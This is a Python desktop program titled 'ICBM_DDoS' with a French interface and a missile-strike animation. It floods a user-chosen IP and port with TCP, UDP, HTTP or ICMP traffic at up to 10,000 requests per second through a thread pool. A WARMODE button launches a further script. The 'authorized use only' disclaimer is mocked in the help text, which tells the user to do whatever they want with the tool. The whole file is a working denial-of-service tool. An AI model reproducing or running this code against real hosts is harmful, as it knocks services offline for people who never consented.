


import tkinter as tk
from tkinter import ttk, messagebox
import threading
import time
import random
import math
from datetime import datetime
import socket
import http.client
import os
import concurrent.futures
import platform, subprocess

def icmp_ping(host, timeout=1):
    param = "-n" if platform.system().lower() == "windows" else "-c"
    try:
        output = subprocess.check_output(
            ["ping", param, "1", "-w", str(int(timeout * 1000)), host],
            stderr=subprocess.STDOUT,
            universal_newlines=True
        )
        return "TTL=" in output or "ttl=" in output
    except Exception:
        return False

class NetworkMonitor:
    def __init__(self, root):
        self.root = root
        self.root.title("-----ICBM_DDoS_V0.1-----")
        self.root.geometry("1400x800")
        self.root.configure(bg="#1e1b4b")
        
        self.is_running = False
        self.target_ip = tk.StringVar()
        self.target_port = tk.IntVar(value=80)
        self.packet_size = tk.IntVar(value=1)
        self.requests_per_second = tk.IntVar(value=1)
        self.stats = {"sent": 0, "success": 0, "failed": 0, "bytes": 0}
        self.log_stats = {"sent": 0, "success": 0, "failed": 0, "bytes": 0}
        self.missiles = []
        
        self.protocol = tk.StringVar(value="TCP")
        self.wait_for_reply = tk.BooleanVar(value=False)
        
        self.create_main_interface()
    
    def create_main_interface(self):
        # Header
        header = tk.Frame(self.root, bg="#4c1d95", height=80)
        header.pack(fill=tk.X, side=tk.TOP)
        
        title = tk.Label(header, text="🌍----ICBM_DDoS---- 🚀",
                        font=("Arial", 28, "bold"), fg="white", bg="#4c1d95")
        title.pack(pady=10)
        
        subtitle = tk.Label(header, text="Outil de test de charge légal - Usage autorisé uniquement",
                           font=("Arial", 12), fg="#fbbf24", 
                           bg="#4c1d95")
        subtitle.pack()
        
        # Container principal
        main_container = tk.Frame(self.root, bg="#1e1b4b")
        main_container.pack(fill=tk.BOTH, expand=True)
        
        # Panel gauche - Contrôles
        self.left_panel = tk.Frame(main_container, bg="#312e81", width=320)
        self.left_panel.pack(side=tk.LEFT, fill=tk.Y, padx=5, pady=5)
        self.left_panel.pack_propagate(False)
   
        self.create_controls(self.left_panel)
        
        # Panel central - Visualisation Terre
        center_panel = tk.Frame(main_container, bg="#1e1b4b")
        center_panel.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        self.canvas = tk.Canvas(center_panel, bg="#1e1b4b", highlightthickness=0)
        self.canvas.pack(fill=tk.BOTH, expand=True)
        
        self.draw_earth()
        
        # Status indicator
        status_frame = tk.Frame(center_panel, bg="#4c1d95")
        status_frame.place(x=10, y=10)
        
        self.status_label = tk.Label(status_frame, text="⭕ En attente",
                                     font=("Arial", 12, 
                                           "bold"), fg="white", bg="#4c1d95",
                                     padx=10, pady=5)
        self.status_label.pack()
        
        # Panel droit - Logs
        right_panel = tk.Frame(main_container, bg="#312e81", width=400)
        right_panel.pack(side=tk.LEFT, fill=tk.Y, padx=5, pady=5)
        right_panel.pack_propagate(False)
 
        self.create_logs_panel(right_panel)

        # --- Footer ---
        footer_frame = tk.Frame(self.root, bg="#4c1d95", height=60) 
        footer_frame.pack(fill=tk.X, side=tk.BOTTOM, pady=(5, 0))

        # 1. Bouton unique Démarrer/Arrêter (Aligné à gauche)
        self.toggle_btn = tk.Button(
            footer_frame, text="▶ Démarrer Test",
            command=self.toggle_test, font=("Arial", 14, "bold"),
            bg="#22c55e", fg="white", padx=20, pady=14
        )
        self.toggle_btn.pack(side=tk.LEFT, padx=(5 + 10, 10))

        # 2. Boutons Options, Exporter, Aide (Décalé vers la gauche pour alignement)
        button_container = tk.Frame(footer_frame, bg="#4c1d95")
        
        # Décalage de 180px vers la gauche pour le conteneur des boutons
        button_container.pack(pady=5, expand=True, padx=(0, 180)) 

        btn_font = ("Arial", 11, "bold")
        btn_bg = "#3b82f6"
        btn_fg = "white"
        btn_padx = 15
        btn_pady = 5

        # Espacement interne des trois boutons
        INTERNAL_PADX = 25 

        self.footer_btn_1 = tk.Button(
            button_container, 
            text="WARMODE",
            font=btn_font, bg=btn_bg, fg=btn_fg,
            padx=btn_padx, pady=btn_pady,
            command=self.show_WARMODE 
        )

        self.footer_btn_1.pack(side=tk.LEFT, padx=INTERNAL_PADX)

        self.footer_btn_2 = tk.Button(
            button_container, 
            text="💾 Exporter Logs",
            font=btn_font, bg=btn_bg, fg=btn_fg,
            padx=btn_padx, pady=btn_pady,
            command=self.export_logs
        )
        
        self.footer_btn_2.pack(side=tk.LEFT, padx=INTERNAL_PADX)

        self.footer_btn_3 = tk.Button(
            button_container, 
            text="❓ Aide",
            font=btn_font, bg=btn_bg, fg=btn_fg,
            padx=btn_padx, pady=btn_pady,
            command=self.show_help
        )
        self.footer_btn_3.pack(side=tk.LEFT, padx=INTERNAL_PADX)
    
    def create_controls(self, parent):
        controls_frame = tk.Frame(parent, bg="#312e81")
        controls_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # IP Target
        ip_frame = tk.LabelFrame(controls_frame, text="🎯 Adresse IP Cible",
                                 font=("Arial", 11, "bold"), fg="#fbbf24",
                                 bg="#4c1d95", padx=10, pady=10)
        ip_frame.pack(fill=tk.X, pady=10)
        
        ip_entry = tk.Entry(ip_frame, textvariable=self.target_ip,
                            font=("Arial", 12), width=20)
        ip_entry.pack(pady=5)
        ip_entry.insert(0, "192.168.1.1")

        # Port cible
        port_frame = tk.LabelFrame(controls_frame, text="🔌 Port cible",
                                   font=("Arial", 11, "bold"), fg="#fbbf24",
                                   bg="#4c1d95", padx=10, pady=10)
        port_frame.pack(fill=tk.X, pady=10)

        # Liste des ports courants
        common_ports = [
            ("HTTP (80)", 80),
            ("HTTPS (443)", 443),
            ("FTP (21)", 21),
            ("SSH (22)", 22),
            ("SMTP (25)", 25),
            ("DNS (53)", 53),
            ("POP3 (110)", 110),
            ("IMAP (143)", 143),
            ("MySQL (3306)", 3306),
            ("PostgreSQL (5432)", 5432),
            ("Custom...", None)
        ]

        def on_port_select(event=None):
            sel = port_combo.current()
            port = common_ports[sel][1]
            if port is not None:
                self.target_port.set(port)
                port_entry.config(state=tk.DISABLED)
            else:
                port_entry.config(state=tk.NORMAL)

        port_combo = ttk.Combobox(port_frame, values=[name for name, _ in common_ports], state="readonly")
        port_combo.current(0)
        port_combo.pack(pady=2, fill=tk.X)
        port_combo.bind("<<ComboboxSelected>>", on_port_select)

        port_entry = tk.Entry(port_frame, textvariable=self.target_port, font=("Arial", 12), width=10, state=tk.DISABLED)
        port_entry.pack(pady=5)
        port_entry.insert(0, "80")

        # Taille du paquet
        size_frame = tk.LabelFrame(controls_frame, text="📦 Taille du paquet (octets)",
                                   font=("Arial", 11, "bold"), fg="#fbbf24",
                                   bg="#4c1d95", padx=10, pady=10)
        size_frame.pack(fill=tk.X, pady=10)
        size_entry = tk.Entry(size_frame, textvariable=self.packet_size,
                              font=("Arial", 12), width=10)
        size_entry.pack(pady=5)
        
        # Requests par second
        rps_frame = tk.LabelFrame(controls_frame, text="⚡ Requêtes/seconde",
                                  font=("Arial", 11, "bold"), fg="#fbbf24",
                                  bg="#4c1d95", padx=10, pady=10)
        rps_frame.pack(fill=tk.X, pady=10)
        
        self.rps_label = tk.Label(rps_frame, text="1 req/s",
                                  font=("Arial", 12, "bold"), fg="white", bg="#4c1d95")
        self.rps_label.pack(pady=5)
        
        # Augmentation du maximum à 10000 req 
        rps_scale = tk.Scale(rps_frame, from_=1, to=10000, orient=tk.HORIZONTAL,
                             variable=self.requests_per_second, command=self.update_rps_label,
                             bg="#4c1d95", fg="white", highlightthickness=0)
        rps_scale.pack(fill=tk.X, pady=5)
        
        warning = tk.Label(rps_frame, text="⚠️ Limité à 10000 req/s - utilisez avec précaution",
                          font=("Arial", 9), fg="#fbbf24", bg="#4c1d95", wraplength=250)
        warning.pack()
        
        # Choix du protocole
        proto_frame = tk.LabelFrame(controls_frame, text="🌐 Protocole",
                                    font=("Arial", 11, "bold"), fg="#fbbf24",
                                    bg="#4c1d95", padx=10, pady=10)
        proto_frame.pack(fill=tk.X, pady=10)
        proto_combo = ttk.Combobox(proto_frame, textvariable=self.protocol, state="readonly",
                                  values=["TCP", "UDP", "HTTP", "ICMP"])
        proto_combo.pack(fill=tk.X, pady=2)

        # Option pour attendre une réponse (stylisée comme un bouton toggle)
        reply_check = tk.Checkbutton(
            proto_frame,
            text="Attendre une réponse (reçu)",
            variable=self.wait_for_reply,
            indicatoron=0,
            relief="raised",
            bd=3,
            padx=10,
            pady=5,
            bg="#9ca3af",
            fg="black",
            selectcolor="#22c55e",
            font=("Arial", 10, "bold")
        )
        reply_check.pack(fill=tk.X, pady=5, ipady=2)
        
        # Stats
        stats_frame = tk.LabelFrame(controls_frame, text="📊 Statistiques",
                                   font=("Arial", 11, "bold"), fg="#fbbf24",
                                   bg="#4c1d95", padx=10, pady=10)
        stats_frame.pack(fill=tk.X, pady=10)
        
        self.stats_labels = {}
        for key, label in [("sent", "Envoyées"), ("success", "Succès"), 
                          ("failed", "Échecs"), ("avg_latency", "Latence moy")]:
            
            row = tk.Frame(stats_frame, bg="#4c1d95")
            row.pack(fill=tk.X, pady=2)
            tk.Label(row, text=f"{label}:", font=("Arial", 10),
                    fg="white", bg="#4c1d95").pack(side=tk.LEFT)
            self.stats_labels[key] = tk.Label(row, text="0", font=("Arial", 10, "bold"),
                                              fg="#fbbf24", bg="#4c1d95")
            self.stats_labels[key].pack(side=tk.RIGHT)
    
    def create_logs_panel(self, parent):
        logs_frame = tk.Frame(parent, bg="#312e81")
        logs_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        title = tk.Label(logs_frame, text="📝 Journal de Logs",
                        font=("Arial", 14, "bold"), fg="#fbbf24", bg="#312e81")
        title.pack(pady=10)
        
        # Scrollbar
        scroll_frame = tk.Frame(logs_frame, bg="#312e81")
        scroll_frame.pack(fill=tk.BOTH, 
                          expand=True)
        
        scrollbar = tk.Scrollbar(scroll_frame)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        
        self.logs_text = tk.Text(scroll_frame, font=("Courier", 9),
                                bg="#1e1b4b", fg="white", wrap=tk.WORD,
                                yscrollcommand=scrollbar.set)
        self.logs_text.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        scrollbar.config(command=self.logs_text.yview)
        
        # Tags pour coloration
        self.logs_text.tag_config("SUCCESS", foreground="#22c55e")
        self.logs_text.tag_config("FAILED", foreground="#ef4444")
        self.logs_text.tag_config("INFO", foreground="#3b82f6")
        self.logs_text.tag_config("timestamp", foreground="#fbbf24")
    
    def draw_earth(self):
        # Attendre que le canvas soit visible
        self.root.update()
        width = self.canvas.winfo_width()
        height = self.canvas.winfo_height()
        
        if width < 10 or height < 10:
            self.root.after(100, self.draw_earth)
            return
        
    
        SHIFT_LEFT = 110
        self.center_x = (width // 2) - SHIFT_LEFT 
        self.center_y = height // 2
        self.earth_radius = 100
        
        # Terre principale
        self.canvas.create_oval(
            self.center_x - self.earth_radius,
            self.center_y - self.earth_radius,
            self.center_x + self.earth_radius,
            self.center_y + self.earth_radius,
            fill="#22c55e", outline="#fbbf24", width=4
        )
        
        # Continents stylisés
        self.canvas.create_oval(
            self.center_x - 40, self.center_y - 50,
            self.center_x, self.center_y - 10,
            fill="#166534", outline=""
        )
        
        self.canvas.create_oval(
            self.center_x + 10, self.center_y + 10,
            self.center_x + 50, self.center_y + 50,
            fill="#166534", outline=""
        )
        
        self.canvas.create_oval(
            self.center_x - 20, self.center_y - 70,
            self.center_x + 10, self.center_y - 50,
            fill="#166534", outline=""
        )
        
        # Target marker 
        self.target_circle = self.canvas.create_oval(
            self.center_x - 8, self.center_y - 8,
            self.center_x + 8, self.center_y + 8,
            fill="#ef4444", outline="#fbbf24", width=3
        )
        
        self.pulse_target()
    
    def pulse_target(self):
        if hasattr(self, 'target_circle'):
            coords = self.canvas.coords(self.target_circle)
            if coords:
                current_size = (coords[2] - coords[0]) / 2
                new_size = 8 + 4 * math.sin(time.time() * 3)
                
                self.canvas.coords(
                    self.target_circle,
                    self.center_x - new_size, self.center_y - new_size,
                    self.center_x + new_size, self.center_y + new_size
                )
        
        self.root.after(50, self.pulse_target)
    
    def update_rps_label(self, value):
        self.rps_label.config(text=f"{value} req/s")
 
    
    def add_log(self, status, message, latency="-"):
        if status != "INFO":
            return
        timestamp = datetime.now().strftime("%H:%M:%S")
        log_line = f"[{timestamp}] {status} - {message} - {latency}\n"
        self.logs_text.insert(tk.END, log_line)
        self.logs_text.see(tk.END)
    
    def launch_missile(self):
        # Supprimer l'ancien missile s'il existe
        for missile in self.missiles:
            if missile.get('id'):
                self.canvas.delete(missile['id'])
            if missile.get('line_id'):
                self.canvas.delete(missile['line_id'])
        self.missiles.clear()

        if not hasattr(self, 'center_x'):
            return

        angle = random.random() * 2 * math.pi
        distance = 80 + random.random() * 100
        start_x = self.center_x + math.cos(angle) * distance
        start_y = self.center_y + math.sin(angle) * distance

        missile = {
            'x': start_x,
            'y': start_y,
            'target_x': self.center_x,
            'target_y': self.center_y,
            'progress': 0,
            'id': None,
            'line_id': None,
            'in_flight': True
        }

        missile['id'] = self.canvas.create_oval(
            start_x - 6, start_y - 6,
            start_x + 6, start_y + 6,
            fill="#fbbf24", outline="#f59e0b", width=2
        )

        missile['line_id'] = self.canvas.create_line(
            start_x, start_y, start_x, start_y,
            fill="#fbbf24", width=2, dash=(5, 5)
        )

        self.missiles.append(missile)
        self.animate_single_missile(missile)

    def animate_single_missile(self, missile):
        # Animation propre d'un seul missile
        if not missile['in_flight']:
            return

        missile['progress'] += 0.02
        if missile['progress'] > 1.0:
            missile['progress'] = 1.0

        current_x = missile['x'] + (missile['target_x'] - missile['x']) * missile['progress']
        current_y = missile['y'] + (missile['target_y'] - missile['y']) * missile['progress']

        if missile['id']:
            self.canvas.coords(
                missile['id'],
                current_x - 6, current_y - 6,
                current_x + 6, current_y + 6
            )

        if missile['line_id']:
            self.canvas.coords(
                missile['line_id'],
                missile['x'], missile['y'],
                current_x, current_y
            )

        if missile['progress'] >= 1.0:
            # Arrivé au centre, pause puis suppression
            missile['in_flight'] = False
            self.root.after(500, lambda: self.remove_and_ready_missile(missile))
        else:
            self.root.after(20, lambda: self.animate_single_missile(missile))

    def remove_and_ready_missile(self, missile):
        if missile.get('id'):
            self.canvas.delete(missile['id'])
        if missile.get('line_id'):
            self.canvas.delete(missile['line_id'])
        if missile in self.missiles:
            self.missiles.remove(missile)
    
    def simulate_request(self):
        ip = self.target_ip.get()
        port = self.target_port.get()
        size = self.packet_size.get()
        proto = self.protocol.get()
        wait_reply = self.wait_for_reply.get()
        data = b"x" * max(1, int(size))
        start_time = time.time()
        success = False
        bytes_sent = 0

        try:
            if proto == "TCP":
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.settimeout(1)
                    s.connect((ip, int(port)))
                    s.sendall(data)
                    bytes_sent = len(data)
                    if wait_reply:
                        try:
                            s.recv(1024)
                        except Exception:
                            pass
                    success = True
            elif proto == "UDP":
                with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                    s.settimeout(1)
                    s.sendto(data, (ip, int(port)))
                    bytes_sent = len(data)
                    if wait_reply:
                        try:
                            s.recvfrom(1024)
                        except Exception:
                            pass
                    success = True
            elif proto == "HTTP":
                conn = http.client.HTTPConnection(ip, int(port), timeout=1)
                try:
                    conn.request("GET", "/")
                    if wait_reply:
                        try:
                            resp = conn.getresponse()
                            if resp.status < 400:
                                success = True
                            else:
                                success = False
                        except Exception:
                            success = False
                    else:
                        # On n'attend pas la réponse, on considère la requête envoyée
                        success = True
                except Exception:
                    success = False
                finally:
                    conn.close()
                # Pour HTTP, on ne compte pas les octets envoyés
            elif proto == "ICMP":
                # Pour ICMP, on attend toujours la réponse du ping
                success = icmp_ping(ip, timeout=1)
                # Pour ICMP, on ne compte pas les octets envoyés
            else:
                success = False
        
        except Exception:
            success = False

        latency = int((time.time() - start_time) * 1000)
        self.stats["sent"] += 1
        self.log_stats["sent"] += 1
        self.stats["bytes"] += bytes_sent
        self.log_stats["bytes"] += bytes_sent
        if success:
            self.stats["success"] += 1
            self.log_stats["success"] += 1
        else:
            self.stats["failed"] += 1
            self.log_stats["failed"] += 1
        if "latencies" not in self.stats:
            self.stats["latencies"] = []
        self.stats["latencies"].append(latency)
        self.root.after(0, self.update_stats_ui)
        status = "SUCCESS" if success else "FAILED"
        msg = f"{ip}:{port} | {size} octets"
        self.root.after(0, lambda s=status, m=msg, l=latency: self.add_log(s, m, f"{l}ms"))
    
    def update_stats_ui(self):
        self.stats_labels["sent"].config(text=str(self.stats["sent"]))
        self.stats_labels["success"].config(text=str(self.stats["success"]))
        self.stats_labels["failed"].config(text=str(self.stats["failed"]))
        
        if self.stats["latencies"]:
            avg = sum(self.stats["latencies"]) / len(self.stats["latencies"])
            self.stats_labels["avg_latency"].config(text=f"{int(avg)}ms")
    
    def test_loop(self):
        # Utilise un ThreadPoolExecutor pour limiter le nombre de threads actifs
        max_workers = min(100, self.requests_per_second.get(), 1000)
        with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
            while self.is_running:
                rps = max(1, self.requests_per_second.get())
                start = time.time()
                futures = []
                for _ in range(rps):
                    if not self.is_running:
                        break
                    futures.append(executor.submit(self.simulate_request))
   
                # Attendre que toutes les requêtes de cette seconde soient terminées ou presque
                concurrent.futures.wait(futures, timeout=1.0)
                elapsed = time.time() - start
                if elapsed < 1.0:
                    time.sleep(1.0 - elapsed)
    
    def start_test(self):
        if not self.target_ip.get():
            messagebox.showwarning("Attention", "Veuillez entrer une adresse IP cible")
            return
        
        self.is_running = True
        self.start_missile_animation()
        self.status_label.config(text="🟢 Test en cours...", fg="#22c55e")
        self.add_log("INFO", "Test démarré", "-")
        thread = threading.Thread(target=self.test_loop, daemon=True)
        thread.start()
        # Affichage en temps réel seulement si la case est cochée
        if self.wait_for_reply.get():
            self.root.after(1000, self.log_summary)

    def stop_test(self):
        self.is_running = False
        self.status_label.config(text="⭕ En attente", fg="white")
        self.add_log("INFO", "Test arrêté", "-")
   
        for missile in self.missiles:
            if missile.get('id'):
                self.canvas.delete(missile['id'])
            if missile.get('line_id'):
                self.canvas.delete(missile['line_id'])
        self.missiles.clear()
        # Résumé global
        self.show_total_summary()

    def toggle_test(self):
        if not self.is_running:
            self.start_test()
            self.toggle_btn.config(
                text="⬛ Arrêter Attaque",
                bg="#ef4444"
            )
        else:
            self.stop_test()
            self.toggle_btn.config(
                text="▶ Démarrer Test",
                bg="#22c55e"
            )
    
    def log_summary(self):
        sent = self.log_stats["sent"]
        success = self.log_stats["success"]
        failed = self.log_stats["failed"]
        bytes_sent = self.log_stats.get("bytes", 0)
        timestamp = datetime.now().strftime("%H:%M:%S")
        summary = f"[{timestamp}] Envoyées: {sent} | Succès: {success} | Échecs: {failed} | Octets envoyés: {bytes_sent}\n"
        self.logs_text.insert(tk.END, summary)
        self.logs_text.see(tk.END)
        # Réinitialiser pour la prochaine seconde
        self.log_stats = {"sent": 0, "success": 0, "failed": 0, "bytes": 0}
        # Planifier le prochain résumé
        if self.is_running:
            self.root.after(1000, self.log_summary)

    def show_total_summary(self):
        sent = self.stats["sent"]
        success = self.stats["success"]
        failed = self.stats["failed"]
        bytes_sent = self.stats.get("bytes", 0)
        timestamp = datetime.now().strftime("%H:%M:%S")
        summary = (
            f"=== Résumé total ({timestamp}) ===\n"
            f"Total envoyées: {sent}\n"
            f"Total succès: {success}\n"
            f"Total échecs: {failed}\n"
            f"Total octets envoyés: {bytes_sent}\n"
            "===============================\n"
        )
        self.logs_text.insert(tk.END, summary)
        self.logs_text.see(tk.END)
    
    def start_missile_animation(self):
        self.missile_anim_running = True
        self.missile_loop()

    def missile_loop(self):
        if self.is_running:
            self.launch_missile()
            # 1 missile/seconde, modifie 10000 pour ajuster la fréquence
            self.root.after(1000, self.missile_loop)
        else:
            self.missile_anim_running = False

    def show_WARMODE(self):
        try:
            subprocess.Popen(["start", "cmd", "/k", "python", "ICBM_DDoS\\object11.py"], shell=True)
        except Exception as e:
            messagebox.showerror("Erreur", f"Impossible de lancer WARMODE : {e}")



    def export_logs(self):
        """Affiche une boîte de dialogue pour l'export."""
        messagebox.showinfo("Exporter", "L'exportation des logs n'est pas encore implémentée.")
    
    def show_help(self):
        """Affiche une boîte de dialogue d'aide."""
        messagebox.showinfo("Aide", 
                           "ICBM_DDoS\n\n"
            "Ceci est un outil de test de performance réseau.\n"
            "Usage autorisé uniquement sur les réseaux dont vous avez la permission.\n"
            "Nan je deconne fais ce que tu veux avec (mais je suis pas responsable)")

if __name__ == "__main__":
    root = tk.Tk()
    app = NetworkMonitor(root)
    root.mainloop()